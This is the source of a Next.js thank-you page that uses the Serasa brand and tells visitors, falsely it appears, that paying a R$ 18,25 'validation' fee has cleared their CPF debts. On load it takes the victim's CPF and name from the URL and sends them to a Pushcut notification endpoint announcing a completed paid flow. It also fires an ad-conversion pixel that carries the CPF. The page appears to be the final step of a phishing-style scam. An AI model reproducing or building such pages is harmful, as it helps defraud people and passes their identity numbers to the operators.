"use client";

import { useSearchParams } from "next/navigation";
import { useEffect, useRef, Suspense } from "react";
import Image from "next/image";
import { CheckCircle, Shield, Star } from "lucide-react";

function ObrigadoContent() {
  const searchParams = useSearchParams();
  const notificationSent = useRef(false);
  const cpf = searchParams.get("cpf") || "";
  const nome = searchParams.get("nome") || "";

  useEffect(() => {
    if (!notificationSent.current) {
      notificationSent.current = true;
      // Notificacao Pushcut - Validacao paga (ultima etapa)
      fetch("https://api.pushcut.io/EAdPHzz_Giwpjt0AwH9L_/notifications/Serasa", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ text: `Validacao PAGA - CPF: ${cpf} - Nome: ${nome} - Valor: R$ 18,25 - FLUXO COMPLETO!` }),
      }).catch(() => {});

      // Pixel de conversao - Validacao paga
      const fireConversion = () => {
        if (typeof window !== "undefined" && (window as any).gtag) {
          (window as any).gtag("event", "conversion", {
            send_to: "AW-18028229407/CfDYCPay04wcEJ_mw5RD",
            value: 18.25,
            currency: "BRL",
            transaction_id: `${cpf}-validacao-${Date.now()}`,
          });
          return true;
        }
        return false;
      };

      if (!fireConversion()) {
        const interval = setInterval(() => {
          if (fireConversion()) clearInterval(interval);
        }, 500);
        setTimeout(() => clearInterval(interval), 10000);
      }
    }
  }, [cpf, nome]);

  return (
    <div className="flex min-h-screen flex-col bg-gradient-to-b from-green-50 to-white">
      <header className="bg-[#E63888] py-6">
        <div className="container mx-auto flex items-center justify-center px-4">
          <Image
            src="/serasa-logo.png"
            alt=""
            width={150}
            height={50}
            className="h-10 w-auto brightness-0 invert"
          />
        </div>
      </header>

      <main className="flex flex-1 flex-col items-center justify-center px-4 py-8">
        <div className="w-full max-w-md text-center">
          <div className="mb-8 flex justify-center">
            <div className="relative">
              <div className="absolute inset-0 animate-ping rounded-full bg-green-400 opacity-25"></div>
              <div className="relative flex h-24 w-24 items-center justify-center rounded-full bg-green-500">
                <CheckCircle className="h-14 w-14 text-white" />
              </div>
            </div>
          </div>

          <h1 className="mb-4 text-3xl font-bold text-zinc-800">
            Parabens!
          </h1>
          
          <p className="mb-6 text-xl text-green-600 font-semibold">
            Seu processo foi concluido com sucesso!
          </p>

          <div className="mb-8 rounded-xl bg-white p-6 shadow-lg border border-green-200">
            <div className="mb-4 flex items-center justify-center gap-2">
              <Shield className="h-6 w-6 text-green-500" />
              <span className="font-semibold text-zinc-700">Status: Regularizado</span>
            </div>
            
            <p className="text-zinc-600 mb-4">
              Todas as pendencias foram quitadas e seu CPF esta regularizado junto aos orgaos competentes.
            </p>

            <div className="border-t border-zinc-200 pt-4">
              <p className="text-sm text-zinc-500 mb-2">CPF:</p>
              <p className="text-lg font-semibold text-zinc-800">{cpf}</p>
            </div>
          </div>

          <div className="mb-8 rounded-xl bg-amber-50 p-4 border border-amber-200">
            <div className="flex items-center justify-center gap-2 mb-2">
              <Star className="h-5 w-5 text-amber-500" />
              <span className="font-semibold text-amber-700">Importante</span>
            </div>
            <p className="text-sm text-amber-600">
              A atualizacao nos sistemas pode levar ate 72 horas uteis para ser refletida em todas as bases de dados.
            </p>
          </div>

          <div className="text-center text-xs text-zinc-400">
            <p>Em caso de duvidas, entre em contato com o suporte.</p>
            <p className="mt-2">Obrigado por utilizar nossos servicos!</p>
          </div>
        </div>
      </main>
    </div>
  );
}

export default function ObrigadoPage() {
  return (
    <Suspense
      fallback={
        <div className="flex min-h-screen items-center justify-center bg-green-50">
          <p className="text-zinc-600">Carregando...</p>
        </div>
      }
    >
      <ObrigadoContent />
    </Suspense>
  );
}
